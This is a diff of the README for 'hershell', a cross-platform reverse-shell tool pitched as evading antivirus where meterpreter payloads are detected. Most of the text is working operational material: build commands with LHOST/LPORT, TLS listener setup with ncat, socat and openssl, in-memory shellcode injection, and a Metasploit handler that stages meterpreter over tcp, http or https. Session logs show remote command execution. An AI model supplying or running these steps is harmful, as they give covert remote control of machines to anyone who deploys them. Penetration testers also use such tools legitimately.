@@ -15,7 +15,7 @@ Supported OS are:
 
 Although meterpreter payloads are great, they are sometimes spotted by AV products.
 
-The goal of this project is to get a simple reverse shell, which can work on multiple systems,
+The goal of this project is to get a simple reverse shell, which can work on multiple systems.
 
 ## How ?
 
@@ -52,16 +52,16 @@ This custom interactive shell will allow you to execute system commands through 
 The following special commands are supported:
 
 * ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
-* ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it (Windows only at the moment)
-* ``meterpreter IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp meterpreter from metasploit, and execute the shellcode in memory (Windows only at the moment)
+* ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it (Windows only at the moment).
+* ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp meterpreter from metasploit, and execute the shellcode in memory (Windows only at the moment)
 * ``exit`` : exit gracefully
 
-## Examples
+## Usage
 
 First of all, you will need to generate a valid certificate:
 ```bash
 $ make depends
-openssl req -subj '/CN=sysdream.com/O=Sysdream/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
+openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
 Generating a 4096 bit RSA private key
 ....................................................................................++
 .....++
@@ -92,79 +92,89 @@ For Mac OS X
 $ make macos LHOST=192.168.0.12 LPORT=1234
 ```
 
-## Listeners
+## Examples
 
-On the server side, you can use the openssl integrated TLS server:
+### Basic usage
+
+One can use various tools to handle incomming connections, such as:
+
+* socat
+* ncat
+* openssl server module
+* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)
+
+Here is an example with `ncat`:
 
 ```bash
-$ openssl s_server -cert server.pem -key server.key -accept 1234
-Using default temp DH parameters
-ACCEPT
-bad gethostbyaddr
------BEGIN SSL SESSION PARAMETERS-----
-MHUCAQECAgMDBALALwQgsR3QwizJziqh4Ps3i+xHQKs9lvp5RfsYPWjEDB68Z4kE
-MHnP0OD99CHv2u27THKvCHCggKEpgrPnKH+vNGJGPJZ42QylfkekhSwY5Mtr5qYI
-5qEGAgRYgSfgogQCAgEspAYEBAEAAAA=
------END SSL SESSION PARAMETERS-----
-Shared ciphers:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA:ECDHE-RSA-DES-CBC3-SHA:DES-CBC3-SHA
-Signature Algorithms: RSA+SHA256:ECDSA+SHA256:RSA+SHA384:ECDSA+SHA384:RSA+SHA1:ECDSA+SHA1
-Shared Signature Algorithms: RSA+SHA256:ECDSA+SHA256:RSA+SHA384:ECDSA+SHA384:RSA+SHA1:ECDSA+SHA1
-Supported Elliptic Curve Point Formats: uncompressed
-Supported Elliptic Curves: P-256:P-384:P-521
-Shared Elliptic curves: P-256:P-384:P-521
-CIPHER is ECDHE-RSA-AES128-GCM-SHA256
-Secure Renegotiation IS supported
-Microsoft Windows [version 10.0.10586]
-(c) 2015 Microsoft Corporation. Tous droits rservs.
-
-C:\Users\LAB2\Downloads>
+$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
+Ncat: Version 7.60 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 172.16.122.105.
+Ncat: Connection from 172.16.122.105:47814.
+[hershell]> whoami
+desktop-3pvv31a\lab
 ```
 
-Or even better, use socat with its __readline__ module, which gives you a handy history feature:
+### Meterpreter staging
+
+**WARNING**: this currently only work for the Windows platform.
+
+The meterpreter staging currently supports the following payloads :
+
+* `windows/meterpreter/reverse_tcp`
+* `windows/x64/meterpreter/reverse_tcp`
+* `windows/meterpreter/reverse_http`
+* `windows/x64/meterpreter/reverse_http`
+* `windows/meterpreter/reverse_https`
+* `windows/x64/meterpreter/reverse_https`
+
+To use the correct one, just specify the transport you want to use (tcp, http, https)
+
+To use the meterpreter staging feature, just start your handler:
 
 ```bash
-$ socat readline openssl-listen:1234,fork,reuseaddr,verify=0,cert=server.pem
-Microsoft Windows [version 10.0.10586]
-(c) 2015 Microsoft Corporation. Tous droits rservs.
+[14:12:45][172.16.122.105][Sessions: 0][Jobs: 0] > use exploit/multi/handler
+[14:12:57][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+payload => windows/x64/meterpreter/reverse_https
+[14:13:12][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lhost 172.16.122.105
+lhost => 172.16.122.105
+[14:13:15][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lport 8443
+lport => 8443
+[14:13:17][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set HandlerSSLCert ./server.pem
+HandlerSSLCert => ./server.pem
+[14:13:26][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
 
-C:\Users\LAB2\Downloads>
+[*] [2018.01.29-14:13:29] Started HTTPS reverse handler on https://172.16.122.105:8443
+[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
 ```
 
-Or, and this is great, use a metasploit handler:
+Then, in `hershell`, use the `meterpreter` command:
 
 ```bash
-[172.17.0.2][Sessions: 0][Jobs: 0]: > use exploit/multi/handler
-[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set payload python/shell_reverse_tcp_ssl
-payload => python/shell_reverse_tcp_ssl
-[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set lhost 192.168.122.1
-lhost => 192.168.122.1
-[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set lport 4444
-lport => 4444
-[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set handlersslcert /tmp/data/server.pem
-handlersslcert => /tmp/data/server.pem
-[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set exitonsession false
-exitonsession => false
-[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > exploit -j
-[*] Exploit running as background job.
+[hershell]> meterpreter https 172.16.122.105:8443
+```
 
-[-] Handler failed to bind to 192.168.122.1:4444
-[*] Started reverse SSL handler on 0.0.0.0:4444
-[*] Starting the payload handler...
-[172.17.0.2][Sessions: 0][Jobs: 1]: exploit(handler) >
-[*] Command shell session 1 opened (172.17.0.2:4444 -> 172.17.0.1:51995) at 2017-02-09 12:07:51 +0000
-[172.17.0.2][Sessions: 1][Jobs: 1]: exploit(handler) > sessions -i 1
+A new meterpreter session should pop in `msfconsole`:
+
+```bash
+[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
+[*] [2018.01.29-14:16:44] https://172.16.122.105:8443 handling request from 172.16.122.105; (UUID: pqzl9t5k) Staging x64 payload (206937 bytes) ...
+[*] Meterpreter session 1 opened (172.16.122.105:8443 -> 172.16.122.105:44804) at 2018-01-29 14:16:44 +0100
+
+[14:16:46][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  1         meterpreter x64/windows  DESKTOP-3PVV31A\lab @ DESKTOP-3PVV31A  172.16.122.105:8443 -> 172.16.122.105:44804 (10.0.2.15)
+
+[14:16:48][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
 [*] Starting interaction with 1...
 
-Microsoft Windows [version 10.0.10586]
-(c) 2015 Microsoft Corporation. Tous droits rservs.
-
-C:\Users\lab1\Downloads>whoami
-whoami
-desktop-jcfs2ok\lab1
-
-C:\Users\lab1\Downloads>
+meterpreter > getuid
+Server username: DESKTOP-3PVV31A\lab
 ```
-
-## Credits
-
-Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
